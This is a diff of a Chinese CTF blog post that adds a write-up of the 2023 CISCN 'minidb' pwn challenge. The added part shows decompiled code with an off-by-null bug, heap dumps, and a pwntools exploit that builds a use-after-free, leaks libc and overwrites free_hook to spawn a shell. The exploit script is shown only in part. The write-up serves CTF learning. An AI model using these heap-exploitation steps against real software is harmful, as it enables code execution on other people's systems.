@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2023_ciscn_dbgnote复现, StarrySky">
+    <meta name="keywords" content="2023-ciscn-pwn复现, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2023_ciscn_dbgnote复现 | StarrySky</title>
+    <title>2023-ciscn-pwn复现 | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -289,12 +289,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/29.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2023_ciscn_dbgnote复现</h1>
+                    <h1 class="description center-align post-title">2023-ciscn-pwn复现</h1>
                 </div>
             </div>
         </div>
@@ -410,6 +410,14 @@
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/heap/">
+                                <span class="chip bg-color">heap</span>
+                            </a>
+                        
+                            <a href="/tags/oob/">
+                                <span class="chip bg-color">oob</span>
+                            </a>
+                        
                             <a href="/tags/envp/">
                                 <span class="chip bg-color">envp</span>
                             </a>
@@ -446,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-03
+                    2023-08-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    3.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    19 分
                 </div>
                 
 
@@ -478,7 +486,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这题…复现的让我觉得我没学过<code>pwn</code></p>
+                <h2 id="dbgnote"><a href="#dbgnote" class="headerlink" title="dbgnote"></a>dbgnote</h2><p>这题…复现的让我觉得我没学过<code>pwn</code></p>
 <p>漏洞点：</p>
 <pre class="line-numbers language-C" data-language="C"><code class="language-C">  while ( 1 )
   &#123;
@@ -713,6 +721,406 @@ r<span class="token punctuation">.</span>sendafter<span class="token punctuation
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="minidb"><a href="#minidb" class="headerlink" title="minidb"></a>minidb</h2><p>就是说在现场没写不出来比赛完还是写不出来（），看了<code>wp</code>和解析终于看懂了呜呜</p>
+<p>数据库堆题，保护全开，漏洞点如下</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( a1 )
+  &#123;
+    printf(&quot;Input the key: &quot;);
+    __isoc99_scanf(&quot;%ld&quot;, &amp;v3);
+    ptr &#x3D; sub_168D(a1, v3, 0LL);
+    if ( ptr )
+    &#123;
+      printf(&quot;Input the new value: &quot;);
+      __isoc99_scanf(&quot;%255s&quot;, value);
+      len &#x3D; strlen(value);
+
+      *(&amp;ptr-&gt;value + len) &#x3D; 0;                 &#x2F;&#x2F; strlen &lt;&#x3D;255 &amp;&amp; oob write \x00 
+      if ( (a1-&gt;type &#x3D;&#x3D; 1 || a1-&gt;type &#x3D;&#x3D; 2) &amp;&amp; len &gt; 0x7F || (a1-&gt;type &#x3D;&#x3D; 3 || a1-&gt;type &#x3D;&#x3D; 4) &amp;&amp; len &gt; 0xFF )
+      &#123;
+        puts(&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;);
+      &#125;
+      else
+      &#123;
+        memcpy(&amp;ptr-&gt;value, value, len);
+        *(&amp;ptr-&gt;value + len) &#x3D; 0;              
+        puts(&quot;[+] Succesfully update the value of specific key!&quot;);
+      &#125;
+    &#125;
+    else
+    &#123;
+      puts(&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;);
+    &#125;
+  &#125;
+  else
+  &#123;
+    puts(&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;);
+  &#125;
+  return __readfsqword(0x28u) ^ v6;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>虽然限制了在不同类型下的大小，但是在判断大小之前就会将最后一位赋为<code>0</code>，这里可以实现从该堆线下任意一个字节改为<code>0</code>，接下来开始构造堆</p>
+<p>创建一个数据库与三个键值对，目的是在后续将下一个堆<code>name</code>地址末尾改成<code>0</code>时刚好在一个堆上</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1000
+Size: 0x291
+
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1290
+Size: 0x821
+
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1ab0
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1ad0
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1b70
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x558fca8d1c10
+Size: 0xa1
+
+Top chunk | PREV_INUSE
+Addr: 0x558fca8d1cb0
+Size: 0x20351<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再创建一个数据库之后用第一个数据库创建两个键值对并删除第二个键值对和第二个数据库，这样再次申请数据库时就可以让它的<code>name</code>落在这个堆</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00000
+Size: 0x291
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00290
+Size: 0x821
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00ab0
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00ad0
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00b70
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa00c10
+Size: 0xa1
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x55b60aa00cb0
+Size: 0x821
+fd: 0x7fd935e27be0
+bk: 0x7fd935e27be0
+
+Free chunk (tcache)
+Addr: 0x55b60aa014d0
+Size: 0x20
+fd: 0x00
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55b60aa014f0
+Size: 0xa1
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x55b60aa01590
+Size: 0xa1
+fd: 0x00
+
+Top chunk | PREV_INUSE
+Addr: 0x55b60aa01630
+Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再次申请一个数据库且大小在<code>0x90</code>，此时会用到刚刚删除的数据库的管理和第一个数据库被释放掉的堆，刚好将第三个数据库的<code>name</code>地址低位改成<code>\x00</code>后落在第一个数据库的第四个堆上</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2f000
+Size: 0x291
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2f290
+Size: 0x821
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2fab0
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2fad0
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2fb70
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2fc10
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d2fcb0
+Size: 0x821
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x55ecd0d304d0
+Size: 0x21
+fd: 0x00
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d304f0
+Size: 0xa1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55ecd0d30590
+Size: 0xa1
+
+Top chunk | PREV_INUSE
+Addr: 0x55ecd0d30630
+Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x55ecd0d2fcb0
+0x55ecd0d2fcb0: 0x0000000000000000      0x0000000000000821
+0x55ecd0d2fcc0: 0x0000000000000002      0x000055ecd0d30500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>此时释放掉第一个数据库的第四个堆并不会清除第三个数据库中的<code>name</code>地址，造成<code>UAF</code>，先填充<code>tcache</code>再释放掉这个堆，通过数据库名称列表泄露<code>libc</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">[DEBUG] Received 0xf8 bytes:
+    00000000  5b 2a 5d 20  59 6f 75 20  68 61 76 65  20 32 20 64  │[*] │You │have│ 2 d│
+    00000010  61 74 61 62  61 73 65 20  6e 6f 77 2e  0a 46 6f 6c  │atab│ase │now.│·Fol│
+    00000020  6c 6f 77 69  6e 67 20 69  73 20 79 6f  75 72 20 64  │lowi│ng i│s yo│ur d│
+    00000030  61 74 61 62  73 65 73 3a  0a 0a 09 61  61 61 61 61  │atab│ses:│···a│aaaa│
+    00000040  61 61 61 0a  09 e0 1b 5c  41 a3 7f 0a  0a 43 68 6f  │aaa·│···\│A···│·Cho│
+    00000050  6f 73 65 20  79 6f 75 72  20 63 6f 6d  6d 61 6e 64  │ose │your│ com│mand│
+    00000060  3a 0a 0a 31  2e 20 43 72  65 61 74 65  20 61 20 6e  │:··1│. Cr│eate│ a n│
+    00000070  65 77 20 64  61 74 61 62  61 73 65 2e  0a 32 2e 20  │ew d│atab│ase.│·2. │
+    00000080  55 73 65 20  61 20 64 61  74 61 62 61  73 65 2e 0a  │Use │a da│taba│se.·│
+    00000090  33 2e 20 44  65 6c 65 74  65 20 61 20  64 61 74 61  │3. D│elet│e a │data│
+    000000a0  62 61 73 65  2e 0a 34 2e  20 4c 69 73  74 20 74 68  │base│.·4.│ Lis│t th│
+    000000b0  65 20 64 61  74 61 62 61  73 65 73 2e  0a 35 2e 20  │e da│taba│ses.│·5. │
+    000000c0  43 68 61 6e  67 65 20 74  68 65 20 6e  61 6d 65 20  │Chan│ge t│he n│ame │
+    000000d0  6f 66 20 61  20 64 61 74  61 62 61 73  65 2e 0a 36  │of a│ dat│abas│e.·6│
+    000000e0  36 36 2e 20  45 78 69 74  2e 0a 0a 59  6f 75 72 20  │66. │Exit│.··Y│our │
+    000000f0  63 68 6f 69  63 65 3a 20                            │choi│ce: │
+    000000f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再将释放的堆全部申请回来，单独释放一个堆和<code>name</code>中指向的堆中指向的堆，以此泄露堆地址，因为后续改数据库名称时需要<code>name</code>中的内容</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>
+heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>改第三个数据库的名称为<code>free_hook</code>，此时修改的堆实际上已经被释放，因此能够改到<code>tcache</code>链表，需要注意的是数据路名称大小要是<code>0x90</code>，且改<code>free_hook</code>的时候<code>system</code>地址只能在后面否则会截断，因此要写入的地址是<code>free_hook - 0x88</code>，写入成功在创建一个<code>/bin/sh</code>并释放即可‘</p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
+
+debug <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the value: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the new value: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"666"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add_db</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the type of database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">use</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete_db</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit_db</span><span class="token punctuation">(</span>orig_name<span class="token punctuation">,</span> new_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orig_name<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the new name for database: "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_name<span class="token punctuation">)</span>
+
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
